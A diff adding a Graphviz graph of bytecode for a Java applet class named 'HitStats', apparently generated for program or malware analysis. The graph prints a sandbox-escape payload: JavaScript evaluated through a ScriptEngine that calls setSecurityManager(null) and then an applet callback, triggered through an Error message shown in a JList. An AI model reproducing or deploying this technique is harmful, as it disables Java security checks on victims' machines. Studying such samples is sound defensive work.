@@ -1,0 +1,57 @@
+digraph "" {
+    "r0 := @this: HitStats"
+    "load.r r0"
+    "r0 := @this: HitStats"->"load.r r0";
+    "new javax.swing.JList"
+    "load.r r0"->"new javax.swing.JList";
+    "dup1.r"
+    "new javax.swing.JList"->"dup1.r";
+    "push 1"
+    "dup1.r"->"push 1";
+    "newarray"
+    "push 1"->"newarray";
+    "newarray"->"dup1.r";
+    "push 0"
+    "dup1.r"->"push 0";
+    "new javax.script.ScriptEngineManager"
+    "push 0"->"new javax.script.ScriptEngineManager";
+    "new javax.script.ScriptEngineManager"->"dup1.r";
+    "specialinvoke <javax.script.ScriptEngineManager: void <init>()>"
+    "dup1.r"->"specialinvoke <javax.script.ScriptEngineManager: void <init>()>";
+    "push \"js\""
+    "specialinvoke <javax.script.ScriptEngineManager: void <init>()>"->"push \"js\"";
+    "virtualinvoke <javax.script.ScriptEngineManager: javax.script.ScriptEngine getEngineByName(java.lang.String)>"
+    "push \"js\""->"virtualinvoke <javax.script.ScriptEngineManager: javax.script.ScriptEngine getEngineByName(java.lang.String)>";
+    "virtualinvoke <javax.script.ScriptEngineManager: javax.script.ScriptEngine getEngineByName(java.lang.String)>"->"dup1.r";
+    "interfaceinvoke <javax.script.ScriptEngine: javax.script.Bindings createBindings()> 0"
+    "dup1.r"->"interfaceinvoke <javax.script.ScriptEngine: javax.script.Bindings createBindings()> 0";
+    "store.r r1"
+    "interfaceinvoke <javax.script.ScriptEngine: javax.script.Bindings createBindings()> 0"->"store.r r1";
+    "load.r r1"
+    "store.r r1"->"load.r r1";
+    "push \"applet\""
+    "load.r r1"->"push \"applet\"";
+    "push \"applet\""->"load.r r0";
+    "interfaceinvoke <javax.script.Bindings: java.lang.Object put(java.lang.String,java.lang.Object)> 2"
+    "load.r r0"->"interfaceinvoke <javax.script.Bindings: java.lang.Object put(java.lang.String,java.lang.Object)> 2";
+    "pop"
+    "interfaceinvoke <javax.script.Bindings: java.lang.Object put(java.lang.String,java.lang.Object)> 2"->"pop";
+    "push \"this.toString = function() {\tjava.lang.System.setSecurityManager(null);\tapplet.callBack();\treturn String.fromCharCode(97 + Math.round(Math.random() * 25));};e = new Error();e.message = this;e\""
+    "pop"->"push \"this.toString = function() {\tjava.lang.System.setSecurityManager(null);\tapplet.callBack();\treturn String.fromCharCode(97 + Math.round(Math.random() * 25));};e = new Error();e.message = this;e\"";
+    "push \"this.toString = function() {\tjava.lang.System.setSecurityManager(null);\tapplet.callBack();\treturn String.fromCharCode(97 + Math.round(Math.random() * 25));};e = new Error();e.message = this;e\""->"load.r r1";
+    "interfaceinvoke <javax.script.ScriptEngine: java.lang.Object eval(java.lang.String,javax.script.Bindings)> 2"
+    "load.r r1"->"interfaceinvoke <javax.script.ScriptEngine: java.lang.Object eval(java.lang.String,javax.script.Bindings)> 2";
+    "arraywrite.r"
+    "interfaceinvoke <javax.script.ScriptEngine: java.lang.Object eval(java.lang.String,javax.script.Bindings)> 2"->"arraywrite.r";
+    "specialinvoke <javax.swing.JList: void <init>(java.lang.Object[])>"
+    "arraywrite.r"->"specialinvoke <javax.swing.JList: void <init>(java.lang.Object[])>";
+    "virtualinvoke <HitStats: java.awt.Component add(java.awt.Component)>"
+    "specialinvoke <javax.swing.JList: void <init>(java.lang.Object[])>"->"virtualinvoke <HitStats: java.awt.Component add(java.awt.Component)>";
+    "virtualinvoke <HitStats: java.awt.Component add(java.awt.Component)>"->"pop";
+    "goto return"
+    "pop"->"goto return";
+    "return"
+    "goto return"->"return";
+    "store.r r0"
+    "virtualinvoke <HitStats: java.awt.Component add(java.awt.Component)>"->"store.r r0";
+}
